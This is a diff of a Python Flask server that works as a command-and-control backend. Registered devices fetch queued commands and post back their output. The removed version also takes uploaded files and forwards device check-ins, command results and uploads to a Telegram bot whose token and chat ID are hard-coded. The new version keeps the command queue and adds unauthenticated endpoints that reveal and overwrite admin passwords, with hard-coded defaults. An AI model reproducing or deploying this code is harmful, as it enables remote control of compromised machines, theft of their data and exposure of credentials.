@@ -1,149 +1,83 @@
-from flask import Flask, request, jsonify, abort
-import os, json, time, requests
+from flask import Flask, request, jsonify
+import os
 
 app = Flask(__name__)
-DEVICE_FILE = "devices.json"
-UPLOAD_DIR = "uploads"
-os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
-CHAT_ID = "7554840326"
-COMMAND_QUEUE = {}
+# In-memory storage
+devices = {}
+commands = {}
+results = {}
 
-# Load/save devices
-def load_devices():
-    if os.path.exists(DEVICE_FILE):
-        with open(DEVICE_FILE, "r") as f:
-            return json.load(f)
-    return {}
-
-def save_devices(devices):
-    with open(DEVICE_FILE, "w") as f:
-        json.dump(devices, f)
-
-devices = load_devices()
-
-# Register device
-@app.route("/register", methods=["POST"])
+# Device registration
+@app.route('/register', methods=['POST'])
 def register():
     data = request.json
-    device_id = data.get("device_id")
-    device_name = data.get("device_name")
-    chat_id = data.get("chat_id")
-
-    if device_id and device_name:
-        devices[device_id] = {
-            "device_name": device_name,
-            "chat_id": chat_id,
-            "last_seen": time.time()
-        }
-        save_devices(devices)
-
-        msg = f"✅ Device connected:\nName: {device_name}\nID: {device_id}"
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-            "chat_id": CHAT_ID,
-            "text": msg
-        })
-        return jsonify({"status": "registered"}), 200
-
-    return jsonify({"error": "Missing fields"}), 400
+    device_id = data.get('device_id')
+    owner = data.get('owner')
+    devices[device_id] = {'owner': owner, 'info': data}
+    return jsonify({'status': 'registered'})
 
 # Heartbeat
-@app.route("/heartbeat/<device_id>", methods=["POST"])
+@app.route('/heartbeat/<device_id>', methods=['GET'])
 def heartbeat(device_id):
-    if device_id not in devices:
-        return abort(404)
-    devices[device_id]["last_seen"] = time.time()
-    save_devices(devices)
-    return jsonify({"status": "ok"}), 200
+    if device_id in devices:
+        return jsonify({'status': 'alive'})
+    return jsonify({'status': 'unknown device'}), 404
 
-# Ping check
-@app.route("/ping/<device_id>", methods=["GET"])
-def ping_device(device_id):
-    if device_id not in devices:
-        return abort(404)
-    last_seen = devices[device_id].get("last_seen", 0)
-    if time.time() - last_seen <= 15:
-        return jsonify({"status": "alive"}), 200
-    else:
-        return jsonify({"status": "offline"}), 503
-
-# Get all registered devices
-@app.route("/devices", methods=["GET"])
+# Get devices
+@app.route('/devices', methods=['GET'])
 def get_devices():
-    return jsonify({
-        "devices": [
-            {
-                "device_id": device_id,
-                "device_name": device["device_name"]
-            } for device_id, device in devices.items()
-        ]
-    }), 200
+    return jsonify(devices)
 
-# Queue command for device
-@app.route("/command", methods=["POST"])
-def send_command():
+# Queue command
+@app.route('/command', methods=['POST'])
+def queue_command():
     data = request.json
-    device_id = data.get("device_id")
-    command = data.get("command")
-    args = data.get("args", "")
+    device_id = data.get('device_id')
+    command = data.get('command')
+    if device_id in devices:
+        commands[device_id] = command
+        return jsonify({'status': 'command queued'})
+    return jsonify({'status': 'unknown device'}), 404
 
-    if device_id:
-        COMMAND_QUEUE[device_id] = {
-            "command": command,
-            "args": args
-        }
-        print(f"[COMMAND] To {device_id}: {command} {args}")
-        return jsonify({"status": "sent"}), 200
-
-    return jsonify({"error": "Invalid request"}), 400
-
-# Let device fetch next command
-@app.route("/get_command/<device_id>", methods=["GET"])
+# Get command
+@app.route('/get_command/<device_id>', methods=['GET'])
 def get_command(device_id):
-    if device_id not in COMMAND_QUEUE:
-        return jsonify({"command": None})
-    return jsonify(COMMAND_QUEUE.pop(device_id))
+    command = commands.pop(device_id, None)
+    if command:
+        return jsonify({'command': command})
+    return jsonify({'command': None})
 
-# Device posts command result
-@app.route("/result", methods=["POST"])
-def receive_result():
+# Post result
+@app.route('/result', methods=['POST'])
+def post_result():
     data = request.json
-    output = data.get("output")
-    device_id = data.get("device_id")
+    device_id = data.get('device_id')
+    output = data.get('output')
+    results[device_id] = output
+    return jsonify({'status': 'result received'})
 
-    device_name = devices.get(device_id, {}).get("device_name", "Unknown")
-    message = f"🖥️ *{device_name}* (`{device_id}`)\n\n" + f"```{output.strip()[:4000]}```"
+# Get passwords
+@app.route('/get_passwords', methods=['GET'])
+def get_passwords():
+    admin_password = os.environ.get('ADMIN_PASSWORD', 'default_admin')
+    user_password = os.environ.get('USER_PASSWORD', 'default_user')
+    return jsonify({'admin': admin_password, 'user': user_password})
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    })
+# Set passwords
+@app.route('/set_passwords', methods=['POST'])
+def set_passwords():
+    data = request.json
+    admin_password = data.get('admin')
+    user_password = data.get('user')
+    if admin_password:
+        os.environ['ADMIN_PASSWORD'] = admin_password
+    if user_password:
+        os.environ['USER_PASSWORD'] = user_password
+    return jsonify({'status': 'passwords updated'})
 
-    return jsonify({"status": "received"}), 200
-
-# Receive uploaded file from device
-@app.route("/upload/<device_id>", methods=["POST"])
-def receive_upload(device_id):
-    if 'file' not in request.files:
-        return jsonify({"error": "No file part"}), 400
-
-    file = request.files['file']
-    filename = f"{device_id}_{file.filename}"
-    save_path = os.path.join(UPLOAD_DIR, filename)
-    file.save(save_path)
-
-    msg = f"📂 File uploaded from {device_id}:\n`{filename}`"
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": msg,
-        "parse_mode": "Markdown"
-    })
-
-    return jsonify({"status": "saved", "file": filename}), 200
-
-# Start Flask server
-if __name__ == "__main__":
-    print("Flask server running on http://0.0.0.0:10000")
-    app.run(host="0.0.0.0", port=10000)
+if __name__ == '__main__':
+    # Set default passwords if not already set
+    os.environ.setdefault('ADMIN_PASSWORD', 'Cyb37h4ck37')
+    os.environ.setdefault('USER_PASSWORD', 'user123')
+    app.run(host='0.0.0.0', port=5000)
